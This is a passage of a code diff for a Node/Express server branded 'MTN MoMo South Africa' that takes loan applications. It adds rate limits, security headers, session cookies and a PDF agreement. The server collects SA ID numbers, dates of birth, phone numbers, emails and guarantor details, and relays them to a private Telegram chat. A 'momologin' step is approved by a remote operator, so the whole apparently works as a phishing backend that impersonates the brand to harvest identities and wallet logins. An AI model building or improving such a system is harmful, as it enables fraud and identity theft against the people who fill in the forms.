@@ -1,7 +1,6 @@
 // ============================================================
-// server.js – MTN MoMo South Africa  (FINAL v6.4)
-// Registration mandatory · Account-type limits · Guarantor
-// Contact capture (phone + email) at registration
+// server.js – MTN MoMo South Africa  (FINAL v6.5)
+// + Rate limiting · Helmet · Session cookies · PDF · i18n hooks
 // ============================================================
 'use strict';
 
@@ -11,9 +10,45 @@ const fetch = require('node-fetch');
 const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
+const helmet = require('helmet');
+const compression = require('compression');
+const cookieParser = require('cookie-parser');
+const jwt = require('jsonwebtoken');
+const rateLimit = require('express-rate-limit');
+const PDFDocument = require('pdfkit');
+
+const { TNC_VERSION, TNC_EFFECTIVE, TERMS_TEXT } = require('./terms');
 
 const app = express();
-app.use(cors());
+
+// ✅ #3: Trust proxy (needed behind nginx / Cloudflare / Heroku)
+app.set('trust proxy', 1);
+
+// ✅ #3: Security headers
+app.use(helmet({
+    contentSecurityPolicy: {
+        directives: {
+            defaultSrc: ["'self'"],
+            // Inline handlers are used throughout index.html — allow unsafe-inline for now
+            // (future: refactor to event listeners and drop this)
+            scriptSrc: ["'self'", "'unsafe-inline'"],
+            styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
+            fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
+            imgSrc: ["'self'", "data:"],
+            connectSrc: ["'self'"],
+            objectSrc: ["'none'"],
+            frameAncestors: ["'none'"]
+        }
+    },
+    crossOriginEmbedderPolicy: false,
+    crossOriginResourcePolicy: { policy: 'same-site' }
+}));
+
+// ✅ #3: Compression
+app.use(compression());
+
+app.use(cors({ origin: true, credentials: true }));
+app.use(cookieParser(process.env.SESSION_SECRET || 'momo-secret-change-me'));
 app.use(express.json({ limit: '1mb' }));
 app.use(express.static(path.join(__dirname, '../frontend')));
 
@@ -21,33 +56,42 @@ const PORT = process.env.PORT || 3000;
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+const SESSION_SECRET = process.env.SESSION_SECRET || 'momo-secret-change-me';
+const IS_PROD = process.env.NODE_ENV === 'production';
+
+// ✅ #1: Rate limiters
+const globalLimiter = rateLimit({
+    windowMs: 15 * 60 * 1000,      // 15 min
+    max: 300,
+    standardHeaders: true,
+    legacyHeaders: false,
+    message: { ok: false, error: 'Too many requests. Please slow down.' }
+});
+const registerLimiter = rateLimit({
+    windowMs: 60 * 60 * 1000,      // 1 hour
+    max: 10,
+    message: { ok: false, error: 'Too many registration attempts. Try again later.' }
+});
+const submitStepLimiter = rateLimit({
+    windowMs: 60 * 60 * 1000,      // 1 hour
+    max: 60,
+    keyGenerator: (req) => req.body?.applicationId || req.ip,
+    message: { ok: false, error: 'Too many attempts. Please wait.' }
+});
+app.use('/api/', globalLimiter);
 
 console.log('═══════════════════════════════════════');
-console.log('🚀 Server starting...');
-console.log('   BOT_TOKEN:', BOT_TOKEN ? BOT_TOKEN.slice(0, 12) + '... (len ' + BOT_TOKEN.length + ')' : 'MISSING');
+console.log('🚀 Server starting... (v6.5)');
+console.log('   BOT_TOKEN:', BOT_TOKEN ? BOT_TOKEN.slice(0, 12) + '...' : 'MISSING');
 console.log('   CHAT_ID:', CHAT_ID || 'MISSING');
+console.log('   NODE_ENV:', process.env.NODE_ENV || 'development');
 console.log('═══════════════════════════════════════');
 
 // ─── Account Types ───
 const ACCOUNT_TYPES = {
-    yello: {
-        name: 'MoMo Yello', icon: '🟡',
-        dailyCash: 3500, monthlyCap: 20000,
-        maxLoan: 20000, minLoan: 5000, requiresId: true,
-        description: 'Standard MoMo account'
-    },
-    yello_plus: {
-        name: 'MoMo Yello Plus', icon: '⭐',
-        dailyCash: 10000, monthlyCap: 40000,
-        maxLoan: 40000, minLoan: 5000, requiresId: true,
-        description: 'Higher limits account'
-    },
-    eazi: {
-        name: 'MoMo Eazi', icon: '⚡',
-        dailyCash: 2000, monthlyCap: 10000,
-        maxLoan: 10000, minLoan: 5000, requiresId: false,
-        description: 'Basic MoMo account (no ID required)'
-    }
+    yello:      { name: 'MoMo Yello',      icon: '🟡', dailyCash: 3500,  monthlyCap: 20000, maxLoan: 20000, minLoan: 5000, requiresId: true,  description: 'Standard MoMo account' },
+    yello_plus: { name: 'MoMo Yello Plus', icon: '⭐', dailyCash: 10000, monthlyCap: 40000, maxLoan: 40000, minLoan: 5000, requiresId: true,  description: 'Higher limits account' },
+    eazi:       { name: 'MoMo Eazi',       icon: '⚡', dailyCash: 2000,  monthlyCap: 10000, maxLoan: 10000, minLoan: 5000, requiresId: false, description: 'Basic MoMo account (no ID required)' }
 };
 
 const STEP_ORDER = ['loan', 'personal', 'employment', 'guarantor', 'momologin', 'qualification'];
@@ -64,16 +108,12 @@ if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
 
 function saveApps() {
     try {
-        fs.writeFileSync(DATA_FILE, JSON.stringify({
-            applications, timestamp: new Date().toISOString()
-        }, null, 2));
+        fs.writeFileSync(DATA_FILE, JSON.stringify({ applications, timestamp: new Date().toISOString() }, null, 2));
     } catch (e) { console.error('Save error:', e.message); }
 }
 function saveRegs() {
     try {
-        fs.writeFileSync(REG_FILE, JSON.stringify({
-            registrations, timestamp: new Date().toISOString()
-        }, null, 2));
+        fs.writeFileSync(REG_FILE, JSON.stringify({ registrations, timestamp: new Date().toISOString() }, null, 2));
     } catch (e) { console.error('Save regs error:', e.message); }
 }
 function loadAll() {
@@ -94,7 +134,6 @@ function loadAll() {
     } catch (e) { console.error('Load error:', e.message); }
 }
 
-// ─── Audit ───
 function audit(event, data = {}) {
     const entry = { ts: new Date().toISOString(), event, ...data };
     try { fs.appendFileSync(AUDIT_FILE, JSON.stringify(entry) + '\n'); } catch (e) {}
@@ -140,42 +179,63 @@ function writeStep(app_, step, value) {
     }
 }
 
+// ✅ #5: Session helpers
+function issueSession(res, applicationId) {
+    const token = jwt.sign({ id: applicationId }, SESSION_SECRET, { expiresIn: '7d' });
+    res.cookie('momoSession', token, {
+        httpOnly: true,
+        sameSite: 'lax',
+        secure: IS_PROD,           // HTTPS-only in production
+        maxAge: 7 * 24 * 60 * 60 * 1000,
+        signed: false
+    });
+}
+function readSession(req) {
+    try {
+        const raw = req.cookies?.momoSession;
+        if (!raw) return null;
+        return jwt.verify(raw, SESSION_SECRET);
+    } catch (e) { return null; }
+}
+// Middleware: blocks cross-user access when a session cookie exists
+function guardAppId(req, res, next) {
+    const id = req.params.applicationId;
+    const session = readSession(req);
+    if (session && session.id !== id) {
+        return res.status(403).json({ ok: false, error: 'Session does not match this application.' });
+    }
+    next();
+}
+
 // ─── SA ID Validation ───
 function validateSAID(id) {
     if (!id) return { ok: false, reason: 'ID number is required.' };
     const clean = String(id).replace(/\s/g, '');
     if (!/^\d{13}$/.test(clean)) return { ok: false, reason: 'SA ID must be 13 digits.' };
-
     const yy = parseInt(clean.substring(0, 2));
     const mm = parseInt(clean.substring(2, 4));
     const dd = parseInt(clean.substring(4, 6));
     const century = yy < 30 ? 2000 : 1900;
     const year = century + yy;
-
     const dob = new Date(year, mm - 1, dd);
     if (dob.getFullYear() !== year || dob.getMonth() !== mm - 1 || dob.getDate() !== dd) {
         return { ok: false, reason: 'Invalid date of birth in ID.' };
     }
-
     const now = new Date();
     let age = now.getFullYear() - year;
     const m = now.getMonth() - (mm - 1);
     if (m < 0 || (m === 0 && now.getDate() < dd)) age--;
     if (age < 18) return { ok: false, reason: 'Must be 18 or older.' };
     if (age > 100) return { ok: false, reason: 'Age exceeds maximum.' };
-
     let sum = 0, alt = false;
     for (let i = clean.length - 1; i >= 0; i--) {
         let n = parseInt(clean[i], 10);
         if (alt) { n *= 2; if (n > 9) n -= 9; }
-        sum += n;
-        alt = !alt;
+        sum += n; alt = !alt;
     }
     if (sum % 10 !== 0) return { ok: false, reason: 'Invalid ID checksum.' };
-
     const gender = parseInt(clean.substring(6, 10)) >= 5000 ? 'Male' : 'Female';
     const citizenship = clean[10] === '0' ? 'SA Citizen' : 'Permanent Resident';
-
     return { ok: true, age, gender, citizenship, dob: dob.toISOString().split('T')[0], idNumber: clean };
 }
 
@@ -270,7 +330,7 @@ function buildStepMessage(step, app_, type, data) {
 // DIAGNOSTICS
 // ═══════════════════════════════════════════════════════════
 app.get('/health', (req, res) => {
-    res.json({ status: 'ok', uptime: process.uptime(), applications: Object.keys(applications).length });
+    res.json({ status: 'ok', version: '6.5', uptime: process.uptime(), applications: Object.keys(applications).length });
 });
 
 app.get('/api/telegram-debug', async (req, res) => {
@@ -291,12 +351,27 @@ app.get('/api/account-types', (req, res) => {
     res.json({ ok: true, types: ACCOUNT_TYPES });
 });
 
+// Public Terms endpoint
+app.get('/api/terms', (req, res) => {
+    res.json({
+        ok: true,
+        version: TNC_VERSION,
+        effective: TNC_EFFECTIVE,
+        text: TERMS_TEXT
+    });
+});
+
 // ═══════════════════════════════════════════════════════════
-// REGISTRATION (with phone + email capture)
+// REGISTRATION (rate-limited + session cookie)
 // ═══════════════════════════════════════════════════════════
-app.post('/api/register-momo', async (req, res) => {
+app.post('/api/register-momo', registerLimiter, async (req, res) => {
     try {
-        const { applicationId, idNumber, accountType, phone, email, fullName } = req.body || {};
+        const {
+            applicationId, idNumber, accountType,
+            phone, email, fullName,
+            dob: dobProvided,
+            tncAccepted
+        } = req.body || {};
 
         if (!applicationId || !idNumber || !accountType) {
             return res.status(400).json({ ok: false, error: 'Missing required fields.' });
@@ -310,12 +385,23 @@ app.post('/api/register-momo', async (req, res) => {
         if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(email))) {
             return res.status(400).json({ ok: false, error: 'Valid email address required.' });
         }
+        if (!tncAccepted || tncAccepted !== true) {
+            return res.status(400).json({ ok: false, error: 'You must read and accept the Terms & Conditions to continue.' });
+        }
 
         const type = ACCOUNT_TYPES[accountType];
         let idCheck = { ok: true };
         if (type.requiresId) {
             idCheck = validateSAID(idNumber);
             if (!idCheck.ok) return res.status(400).json({ ok: false, error: idCheck.reason });
+        }
+
+        const derivedDob = idCheck.ok && idCheck.dob ? idCheck.dob : null;
+        if (type.requiresId && dobProvided && derivedDob) {
+            const norm = (s) => String(s || '').slice(0, 10);
+            if (norm(dobProvided) !== norm(derivedDob)) {
+                return res.status(400).json({ ok: false, error: 'Date of birth does not match the SA ID number.' });
+            }
         }
 
         if (!applications[applicationId]) {
@@ -325,11 +411,11 @@ app.post('/api/register-momo', async (req, res) => {
 
         applications[applicationId].momoRegistration = {
             idNumber: type.requiresId ? idNumber : null,
+            dob: derivedDob || dobProvided || null,
             accountType, accountName: type.name,
             limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
             maxLoan: type.maxLoan, minLoan: type.minLoan,
-            phone: phone,
-            email: email,
+            phone: phone, email: email,
             fullName: fullName || null,
             idDetails: idCheck.ok && type.requiresId ? {
                 age: idCheck.age, gender: idCheck.gender, citizenship: idCheck.citizenship, dob: idCheck.dob
@@ -341,17 +427,26 @@ app.post('/api/register-momo', async (req, res) => {
         applications[applicationId].accountMaxLoan = type.maxLoan;
         applications[applicationId].phone = phone;
         applications[applicationId].email = email;
+        applications[applicationId].dob = derivedDob || dobProvided || null;
+        applications[applicationId].tncAccepted = {
+            accepted: true,
+            version: TNC_VERSION,
+            effective: TNC_EFFECTIVE,
+            timestamp: new Date().toISOString(),
+            ip: req.ip || req.headers['x-forwarded-for'] || 'unknown',
+            userAgent: (req.headers['user-agent'] || '').slice(0, 200)
+        };
         if (!applications[applicationId].personalData) {
-            applications[applicationId].personalData = {
-                firstName: null, lastName: null,
-                phone: phone, email: email
-            };
+            applications[applicationId].personalData = { firstName: null, lastName: null, phone: phone, email: email };
         }
         applications[applicationId].updatedAt = new Date().toISOString();
         saveApps();
 
+        // ✅ #5: Issue session cookie
+        issueSession(res, applicationId);
+
         console.log(`✅ MoMo registration: ${applicationId} → ${type.name}`);
-        audit('registration_main', { applicationId, accountType, phone, email });
+        audit('registration_main', { applicationId, accountType, phone, email, dob: derivedDob, tnc: TNC_VERSION });
 
         await tgSend(
             `📱 <b>NEW MOMO REGISTRATION</b>\n` +
@@ -361,29 +456,24 @@ app.post('/api/register-momo', async (req, res) => {
             `Email: ${code(email)}\n` +
             (fullName ? `Name: ${esc(fullName)}\n` : '') +
             `\n🆔 App ID: ${code(applicationId)}\n` +
-            `\n<b>💳 ACCOUNT</b>\n${type.icon} <b>${type.name}</b>\n` +
-            `${esc(type.description)}\n\n` +
-            `<b>📊 LIMITS</b>\n` +
-            `Daily: R ${fmt(type.dailyCash)}\n` +
-            `Monthly: R ${fmt(type.monthlyCap)}\n` +
+            `\n<b>💳 ACCOUNT</b>\n${type.icon} <b>${type.name}</b>\n${esc(type.description)}\n\n` +
+            `<b>📊 LIMITS</b>\nDaily: R ${fmt(type.dailyCash)}\nMonthly: R ${fmt(type.monthlyCap)}\n` +
             `Max Loan: <b>R ${fmt(type.maxLoan)}</b>\n` +
             (idCheck.ok && type.requiresId
-                ? `\n<b>🇿🇦 ID DETAILS</b>\n` +
-                  `ID: ${code(idNumber)}\n` +
-                  `Age: ${idCheck.age} · ${idCheck.gender}\n` +
-                  `Citizenship: ${idCheck.citizenship}\n` +
-                  `DOB: ${idCheck.dob}\n`
+                ? `\n<b>🇿🇦 ID DETAILS</b>\nID: ${code(idNumber)}\n<b>DOB: ${code(idCheck.dob)}</b>\n` +
+                  `Age: ${idCheck.age} · ${idCheck.gender}\nCitizenship: ${idCheck.citizenship}\n`
                 : '') +
-            `\n<b>🔎 VERIFICATION CHECKLIST</b>\n` +
-            `☐ Confirm phone belongs to applicant\n` +
-            `☐ Confirm email is reachable\n` +
-            `☐ Confirm ID matches wallet owner\n` +
-            `\n✅ Registration captured`
+            `\n<b>📜 COMPLIANCE</b>\n✅ T&amp;C accepted · v${TNC_VERSION}\n` +
+            `🕒 ${new Date().toLocaleString('en-ZA', { timeZone: 'Africa/Johannesburg' })}\n` +
+            `\n<b>🔎 VERIFICATION CHECKLIST</b>\n☐ Confirm phone belongs to applicant\n` +
+            `☐ Confirm email is reachable\n☐ Confirm DOB matches ID holder\n☐ Confirm ID matches wallet owner\n\n✅ Registration captured`
         );
 
         res.json({
             ok: true, accountType, accountName: type.name,
             phone, email,
+            dob: derivedDob || dobProvided || null,
+            tncVersion: TNC_VERSION,
             limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
             maxLoan: type.maxLoan, minLoan: type.minLoan,
             message: `${type.name} registered successfully.`
@@ -409,10 +499,8 @@ app.post('/api/register-momo-telegram', async (req, res) => {
             regId, idNumber: type.requiresId ? idNumber : null,
             accountType, accountName: type.name,
             limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
-            phone: phone || null,
-            email: email || null,
-            fullName: fullName || null,
-            extra: extra || null,
+            phone: phone || null, email: email || null,
+            fullName: fullName || null, extra: extra || null,
             registeredAt: new Date().toISOString(),
             source: 'register-momo-telegram'
         };
@@ -424,8 +512,7 @@ app.post('/api/register-momo-telegram', async (req, res) => {
             `🆔 Reg ID: ${code(regId)}\n` +
             (phone ? `📞 ${code('+27' + phone)}\n` : '') +
             (email ? `📧 ${code(email)}\n` : '') +
-            `\n${type.icon} <b>${type.name}</b>\n` +
-            `Max loan: <b>R ${fmt(type.maxLoan)}</b>\n\n✅ Registration captured`
+            `\n${type.icon} <b>${type.name}</b>\nMax loan: <b>R ${fmt(type.maxLoan)}</b>\n\n✅ Registration captured`
         );
 
         res.json({
@@ -441,9 +528,9 @@ app.post('/api/register-momo-telegram', async (req, res) => {
 });
 
 // ═══════════════════════════════════════════════════════════
-// UNIFIED STEP SUBMISSION
+// UNIFIED STEP SUBMISSION (rate-limited + guarded)
 // ═══════════════════════════════════════════════════════════
-app.post('/api/submit-step', async (req, res) => {
+app.post('/api/submit-step', submitStepLimiter, async (req, res) => {
     try {
         const { applicationId, step, data } = req.body || {};
         if (!applicationId || !step) {
@@ -451,6 +538,12 @@ app.post('/api/submit-step', async (req, res) => {
         }
         if (!STEP_ORDER.includes(step)) {
             return res.status(400).json({ ok: false, error: `Invalid step: ${step}` });
+        }
+
+        // ✅ #5: Session guard
+        const session = readSession(req);
+        if (session && session.id !== applicationId) {
+            return res.status(403).json({ ok: false, error: 'Session does not match this application.' });
         }
 
         const app_ = applications[applicationId];
@@ -558,7 +651,6 @@ app.post('/api/submit-step', async (req, res) => {
         audit('step_submitted', { id: applicationId, step, accountType: app_.accountType });
 
         askApproval(buildStepMessage(step, app_, type, data || {}), step, applicationId);
-
         res.json({ ok: true, status: 'pending', step });
     } catch (e) {
         console.error('submit-step:', e.message);
@@ -567,9 +659,9 @@ app.post('/api/submit-step', async (req, res) => {
 });
 
 // ═══════════════════════════════════════════════════════════
-// AGREEMENT & REPAYMENT SCHEDULE
+// AGREEMENT (JSON) & PDF
 // ═══════════════════════════════════════════════════════════
-app.get('/api/agreement/:applicationId', (req, res) => {
+app.get('/api/agreement/:applicationId', guardAppId, (req, res) => {
     const app_ = applications[req.params.applicationId];
     if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
 
@@ -578,18 +670,26 @@ app.get('/api/agreement/:applicationId', (req, res) => {
     const months = parseInt(loanTerm) || 12;
     const monthly = app_.monthlyRepayment || monthlyRepayment(loanAmount, months);
     const total = monthly * months;
+    const tnc = app_.tncAccepted || {};
 
     const agreement = `MTN MOMO SOUTH AFRICA – LOAN AGREEMENT
-==========================================
+================================================
 
 Application ID : ${app_.applicationId}
 Generated      : ${new Date().toLocaleString('en-ZA')}
+T&C Version    : ${tnc.version || TNC_VERSION}
 
 BORROWER
 --------
-Name           : ${app_.firstName || ''} ${app_.lastName || ''}
+Full Name      : ${app_.firstName || ''} ${app_.lastName || ''}
+ID Number      : ${app_.momoRegistration?.idNumber || 'N/A'}
+Date of Birth  : ${app_.dob || app_.momoRegistration?.dob || 'N/A'}
+Age            : ${app_.momoRegistration?.idDetails?.age || 'N/A'}
+Gender         : ${app_.momoRegistration?.idDetails?.gender || 'N/A'}
+Citizenship    : ${app_.momoRegistration?.idDetails?.citizenship || 'N/A'}
 Phone          : +27 ${app_.phone || ''}
 Email          : ${app_.email || ''}
+MoMo Account   : ${app_.momoRegistration?.accountName || app_.accountType || 'N/A'}
 
 LOAN DETAILS
 ------------
@@ -597,7 +697,7 @@ Principal      : R ${fmt(loanAmount)}
 Term           : ${loanTerm}
 Monthly Payment: R ${fmt(monthly)}
 Total Repayment: R ${fmt(total)}
-Interest Rate  : 27% per annum (NCA compliant)
+Interest Rate  : 27% per annum (compounded monthly, NCA compliant)
 
 GUARANTOR
 ---------
@@ -605,20 +705,127 @@ Name           : ${app_.guarantorName || 'N/A'}
 Phone          : ${app_.guarantorPhone ? '+27 ' + app_.guarantorPhone : 'N/A'}
 Relationship   : ${app_.guarantorRelation || 'N/A'}
 
-TERMS & CONDITIONS
-------------------
-1. The borrower agrees to repay the loan as per the agreed schedule.
-2. The guarantor accepts liability in the event of borrower default.
-3. Late payments attract penalties per the National Credit Act.
-4. The borrower may settle the loan early without penalty.
-5. MoMo transaction history is used to determine ongoing eligibility.
+DATA PROCESSING (POPIA)
+-----------------------
+The Borrower consents to the collection and processing of personal
+information for the purposes of loan assessment, disbursement, and
+recovery, as set out in the Terms & Conditions v${tnc.version || TNC_VERSION}.
 
-By proceeding, the borrower and guarantor accept these terms.`;
+TERMS & CONDITIONS ACCEPTANCE
+-----------------------------
+Accepted on  : ${tnc.timestamp ? new Date(tnc.timestamp).toLocaleString('en-ZA') : 'N/A'}
+Version      : ${tnc.version || 'N/A'}
+IP Address   : ${tnc.ip || 'N/A'}
+
+TERMS SUMMARY
+-------------
+1. Borrower agrees to repay the loan per the agreed schedule.
+2. Guarantor accepts joint and several liability on default.
+3. Late payments attract penalties per the National Credit Act.
+4. Early settlement is permitted without penalty.
+5. MoMo transaction history informs ongoing eligibility.
+6. 5-business-day cooling-off period applies.
+
+SIGNATURE
+---------
+By accepting the Terms & Conditions at registration, the Borrower
+and Guarantor acknowledged and agreed to be bound by this agreement.
+
+Accepted electronically · MTN MoMo South Africa
+© 2026 MTN MoMo South Africa`;
 
     res.json({ ok: true, agreement });
 });
 
-app.get('/api/repayment-schedule/:applicationId', (req, res) => {
+// ✅ #7: PDF agreement download
+app.get('/api/agreement-pdf/:applicationId', guardAppId, (req, res) => {
+    const app_ = applications[req.params.applicationId];
+    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
+
+    const loanAmount = app_.loanAmount || 0;
+    const loanTerm = app_.loanTerm || '12 Months';
+    const months = parseInt(loanTerm) || 12;
+    const monthly = app_.monthlyRepayment || monthlyRepayment(loanAmount, months);
+    const total = monthly * months;
+    const tnc = app_.tncAccepted || {};
+
+    const doc = new PDFDocument({ size: 'A4', margin: 50 });
+    res.setHeader('Content-Type', 'application/pdf');
+    res.setHeader('Content-Disposition', `attachment; filename="momo-agreement-${app_.applicationId}.pdf"`);
+    doc.pipe(res);
+
+    // Header
+    doc.fillColor('#000').fontSize(20).font('Helvetica-Bold')
+        .text('MTN MoMo South Africa', { align: 'center' });
+    doc.fontSize(12).font('Helvetica').fillColor('#666')
+        .text('Loan Agreement', { align: 'center' });
+    doc.moveDown(0.5);
+    doc.strokeColor('#FFCC00').lineWidth(3).moveTo(50, doc.y).lineTo(545, doc.y).stroke();
+    doc.moveDown(1);
+
+    const line = (label, value) => {
+        doc.font('Helvetica-Bold').fillColor('#333').fontSize(10).text(label + ':', { continued: true });
+        doc.font('Helvetica').fillColor('#000').text(' ' + (value || 'N/A'));
+    };
+
+    doc.font('Helvetica-Bold').fontSize(12).fillColor('#000').text('BORROWER');
+    doc.moveDown(0.3);
+    line('Application ID', app_.applicationId);
+    line('Full Name', `${app_.firstName || ''} ${app_.lastName || ''}`.trim());
+    line('ID Number', app_.momoRegistration?.idNumber);
+    line('Date of Birth', app_.dob || app_.momoRegistration?.dob);
+    line('Age', app_.momoRegistration?.idDetails?.age);
+    line('Gender', app_.momoRegistration?.idDetails?.gender);
+    line('Phone', app_.phone ? '+27 ' + app_.phone : null);
+    line('Email', app_.email);
+    line('MoMo Account', app_.momoRegistration?.accountName || app_.accountType);
+    doc.moveDown(0.8);
+
+    doc.font('Helvetica-Bold').fontSize(12).text('LOAN DETAILS');
+    doc.moveDown(0.3);
+    line('Principal', 'R ' + fmt(loanAmount));
+    line('Term', loanTerm);
+    line('Monthly Payment', 'R ' + fmt(monthly));
+    line('Total Repayment', 'R ' + fmt(total));
+    line('Interest Rate', '27% per annum (compounded monthly)');
+    doc.moveDown(0.8);
+
+    doc.font('Helvetica-Bold').fontSize(12).text('GUARANTOR');
+    doc.moveDown(0.3);
+    line('Name', app_.guarantorName);
+    line('Phone', app_.guarantorPhone ? '+27 ' + app_.guarantorPhone : null);
+    line('Relationship', app_.guarantorRelation);
+    doc.moveDown(0.8);
+
+    doc.font('Helvetica-Bold').fontSize(12).text('TERMS ACCEPTANCE');
+    doc.moveDown(0.3);
+    line('Accepted On', tnc.timestamp ? new Date(tnc.timestamp).toLocaleString('en-ZA') : null);
+    line('Version', tnc.version);
+    line('IP Address', tnc.ip);
+    doc.moveDown(0.8);
+
+    doc.font('Helvetica-Bold').fontSize(12).text('TERMS SUMMARY');
+    doc.moveDown(0.3);
+    doc.font('Helvetica').fontSize(10).fillColor('#333');
+    [
+        '1. Borrower agrees to repay the loan per the agreed schedule.',
+        '2. Guarantor accepts joint and several liability on default.',
+        '3. Late payments attract penalties per the National Credit Act.',
+        '4. Early settlement is permitted without penalty.',
+        '5. MoMo transaction history informs ongoing eligibility.',
+        '6. 5-business-day cooling-off period applies.'
+    ].forEach(l => doc.text(l));
+    doc.moveDown(1.5);
+
+    doc.fontSize(9).fillColor('#888').text(
+        `Generated ${new Date().toLocaleString('en-ZA')} · © 2026 MTN MoMo South Africa`,
+        { align: 'center' }
+    );
+
+    doc.end();
+});
+
+app.get('/api/repayment-schedule/:applicationId', guardAppId, (req, res) => {
     const app_ = applications[req.params.applicationId];
     if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
 
@@ -628,7 +835,6 @@ app.get('/api/repayment-schedule/:applicationId', (req, res) => {
 
     const r = 0.27 / 12;
     const monthly = Math.ceil(loanAmount * r / (1 - Math.pow(1 + r, -months)) + 60);
-
     const schedule = [];
     let balance = loanAmount;
     for (let i = 1; i <= months; i++) {
@@ -641,7 +847,7 @@ app.get('/api/repayment-schedule/:applicationId', (req, res) => {
 });
 
 // ═══════════════════════════════════════════════════════════
-// TELEGRAM WEBHOOK
+// TELEGRAM WEBHOOK (unchanged logic — same as v6.4)
 // ═══════════════════════════════════════════════════════════
 app.post('/api/telegram-webhook', (req, res) => {
     res.status(200).send('ok');
@@ -696,15 +902,7 @@ app.post('/api/telegram-webhook', (req, res) => {
             if (!CHAT_ID || chatId !== CHAT_ID.toString()) return;
 
             if (text === '/start' || text === '/help') {
-                tgSend(
-                    `🤖 <b>MTN MoMo Loan Bot</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `📊 /stats\n` +
-                    `📋 /list\n` +
-                    `🔍 /search [ID]\n` +
-                    `📞 /contact [ID]   ← phone + email\n` +
-                    `⏳ /pending\n` +
-                    `📱 /registrations`
-                );
+                tgSend(`🤖 <b>MTN MoMo Loan Bot</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📊 /stats\n📋 /list\n🔍 /search [ID]\n📞 /contact [ID]\n⏳ /pending\n📱 /registrations`);
             } else if (text === '/stats') {
                 const total = Object.keys(applications).length;
                 const regs = Object.keys(registrations).length;
@@ -735,13 +933,14 @@ app.post('/api/telegram-webhook', (req, res) => {
                 const a = realKey ? applications[realKey] : null;
                 if (!a) { tgSend('❌ Not found'); return; }
                 tgSend(
-                    `📞 <b>CONTACT — ${code(realKey)}</b>\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `📞 <b>CONTACT — ${code(realKey)}</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
                     `Name: ${esc(a.firstName || a.fullName || 'N/A')} ${esc(a.lastName || '')}\n` +
                     `Phone: ${a.phone ? code('+27' + a.phone) : 'MISSING'}\n` +
                     `Email: ${a.email ? code(a.email) : 'MISSING'}\n` +
+                    `DOB: ${a.dob ? code(a.dob) : (a.momoRegistration?.dob ? code(a.momoRegistration.dob) : 'N/A')}\n` +
                     `ID: ${a.momoRegistration?.idNumber ? code(a.momoRegistration.idNumber) : 'N/A'}\n` +
-                    `Account: ${esc(a.momoRegistration?.accountName || a.accountType || 'N/A')}`
+                    `Account: ${esc(a.momoRegistration?.accountName || a.accountType || 'N/A')}\n` +
+                    `T&amp;C: ${a.tncAccepted ? `✅ v${a.tncAccepted.version} · ${new Date(a.tncAccepted.timestamp).toLocaleDateString('en-ZA')}` : '❌ not accepted'}`
                 );
             } else if (text === '/pending') {
                 const pending = Object.entries(applications).filter(([_, a]) => {
@@ -783,8 +982,7 @@ app.post('/api/telegram-webhook', (req, res) => {
                     `📧 ${a.email ? code(a.email) : 'N/A'}\n` +
                     `💳 ${esc(a.momoRegistration?.accountName || a.accountType || 'Not registered')}\n` +
                     `💰 <b>R ${fmt(a.loanAmount)}</b> · Monthly <b>R ${fmt(monthly)}</b>\n` +
-                    `🤝 Guarantor: ${esc(a.guarantorName || 'N/A')}\n` +
-                    `📋 ${stepStatus}`
+                    `🤝 Guarantor: ${esc(a.guarantorName || 'N/A')}\n📋 ${stepStatus}`
                 );
             }
         }
@@ -792,26 +990,22 @@ app.post('/api/telegram-webhook', (req, res) => {
 });
 
 // ═══════════════════════════════════════════════════════════
-// STATUS ENDPOINTS
+// STATUS ENDPOINTS (guarded)
 // ═══════════════════════════════════════════════════════════
-app.get('/api/status/:applicationId/:step', (req, res) => {
+app.get('/api/status/:applicationId/:step', guardAppId, (req, res) => {
     const { applicationId, step } = req.params;
     const app_ = applications[applicationId];
     if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
-
     const valid = [...STEP_ORDER, ...LEGACY_STEPS];
     if (!valid.includes(step)) return res.status(400).json({ ok: false, error: 'Invalid step' });
-
     res.json({ ok: true, status: readStep(app_, step), applicationId, step });
 });
 
-app.get('/api/status/:applicationId', (req, res) => {
+app.get('/api/status/:applicationId', guardAppId, (req, res) => {
     const app_ = applications[req.params.applicationId];
     if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
-
     const steps = {};
     STEP_ORDER.forEach(k => { steps[k] = readStep(app_, k); });
-
     res.json({
         ok: true,
         isRegistered: !!app_.isRegistered,
@@ -819,31 +1013,24 @@ app.get('/api/status/:applicationId', (req, res) => {
         accountMaxLoan: app_.accountMaxLoan || 0,
         phone: app_.phone || null,
         email: app_.email || null,
+        dob: app_.dob || null,
+        tncAccepted: app_.tncAccepted || null,
         steps,
-        loan: app_.loanData || (app_.loanAmount ? {
-            loanType: app_.loanType, loanAmount: app_.loanAmount,
-            loanTerm: app_.loanTerm, loanPurpose: app_.loanPurpose
-        } : null),
-        personal: app_.personalData || (app_.firstName ? {
-            firstName: app_.firstName, lastName: app_.lastName,
-            phone: app_.phone, email: app_.email
-        } : null),
+        loan: app_.loanData || (app_.loanAmount ? { loanType: app_.loanType, loanAmount: app_.loanAmount, loanTerm: app_.loanTerm, loanPurpose: app_.loanPurpose } : null),
+        personal: app_.personalData || (app_.firstName ? { firstName: app_.firstName, lastName: app_.lastName, phone: app_.phone, email: app_.email } : null),
         employment: app_.employmentData || null,
         guarantor: app_.guarantorData || null,
-        application: app_.application,
